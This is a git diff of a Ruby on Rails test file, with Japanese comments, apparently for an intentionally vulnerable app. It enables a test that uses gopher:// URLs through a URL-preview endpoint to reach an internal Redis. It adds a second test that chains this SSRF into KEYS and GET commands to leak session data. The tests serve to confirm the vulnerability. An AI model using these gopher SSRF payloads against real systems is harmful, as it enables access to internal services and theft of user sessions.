@@ -50,24 +50,66 @@ class SsrfTest < ActiveSupport::TestCase
   end
 
   # 手動確認用: docker-compose 環境で Redis に gopher 経由で到達できることを検証する
-  # test "VULN: gopher scheme reaches Redis (manual, requires redis container)" do
-  #   result = create_task_via_form(@vuln_server, title: "gopher test")
-  #   cookie = result[:cookie]
-  #   task_id = result[:id]
-  #
-  #   res_show = @vuln_server.get("/tasks/#{task_id}", headers: { "Cookie" => cookie })
-  #   csrf_token = extract_csrf_token(res_show.body)
-  #
-  #   # RESP: *1\r\n$4\r\nPING\r\n をURLエンコード
-  #   gopher_url = "gopher://redis:6379/_%2A1%0D%0A%244%0D%0APING%0D%0A"
-  #
-  #   res = @vuln_server.post(
-  #     "/tasks/#{task_id}/preview_url",
-  #     body: URI.encode_www_form("authenticity_token" => csrf_token, "url" => gopher_url),
-  #     headers: { "Cookie" => cookie }
-  #   )
-  #
-  #   body = JSON.parse(res.body)
-  #   assert_includes body["body"].to_s, "+PONG", "Redis に到達して PONG が返るはず"
-  # end
-end
+  test "VULN: gopher scheme reaches Redis (manual, requires redis container)" do
+    result = create_task_via_form(@vuln_server, title: "gopher test")
+    cookie = result[:cookie]
+    task_id = result[:id]
+
+    res_show = @vuln_server.get("/tasks/#{task_id}", headers: { "Cookie" => cookie })
+    csrf_token = extract_csrf_token(res_show.body)
+
+    # RESP: *1\r\n$4\r\nPING\r\n をURLエンコード
+    gopher_url = "gopher://redis:6379/_%2A1%0D%0A%244%0D%0APING%0D%0A"
+
+    res = @vuln_server.post(
+      "/tasks/#{task_id}/preview_url",
+      body: URI.encode_www_form("authenticity_token" => csrf_token, "url" => gopher_url),
+      headers: { "Cookie" => cookie }
+    )
+
+    body = JSON.parse(res.body)
+    assert_includes body["body"].to_s, "+PONG", "Redis に到達して PONG が返るはず"
+  end
+
+  test "VULN: leaks session data from Redis via gopher" do
+    # 1) ログインしてセッションを作成
+    result = create_task_via_form(@vuln_server, title: "session leak test")
+    cookie = result[:cookie]
+    task_id = result[:id]
+    
+    # Cookie からセッションIDを抽出 (_session_id=...)
+    session_id = cookie.match(/_session_id=([^;]+)/)&.captures&.first
+    assert session_id.present?, "セッションIDが取得できるはず"
+
+    # 2) SSRF で KEYS * を実行し、セッションキーを探す
+    res_show = @vuln_server.get("/tasks/#{task_id}", headers: { "Cookie" => cookie })
+    csrf_token = extract_csrf_token(res_show.body)
+
+    keys_url = "gopher://redis:6379/_KEYS%20%2A"
+    res_keys = @vuln_server.post(
+      "/tasks/#{task_id}/preview_url",
+      body: URI.encode_www_form("authenticity_token" => csrf_token, "url" => keys_url),
+      headers: { "Cookie" => cookie }
+    )
+
+    # Redis の KEYS レスポンスから実際のキーを抽出する (例: _session_id:2::...)
+    keys_body = JSON.parse(res_keys.body)["body"]
+    actual_key = keys_body.match(/(_session_id:[^\\\r\n]+)/)&.captures&.first
+    assert actual_key.present?, "Redis 内にセッションキーが存在するはず"
+
+    # 3) 特定したキーを GET で取得
+    encoded_key = ERB::Util.url_encode(actual_key)
+    get_url = "gopher://redis:6379/_GET%20#{encoded_key}%0D%0A"
+    res_get = @vuln_server.post(
+      "/tasks/#{task_id}/preview_url",
+      body: URI.encode_www_form("authenticity_token" => csrf_token, "url" => get_url),
+      headers: { "Cookie" => cookie }
+    )
+
+    # レスポンスに Marshall 形式のセッションデータが含まれることを確認
+    fetched_body = JSON.parse(res_get.body)["body"]
+    assert fetched_body.present?, "セッションデータがリークするはず"
+    assert_match /user_id|_csrf_token/i, fetched_body, "リークしたデータにセッション情報が含まれるはず"
+    end
+    end
+
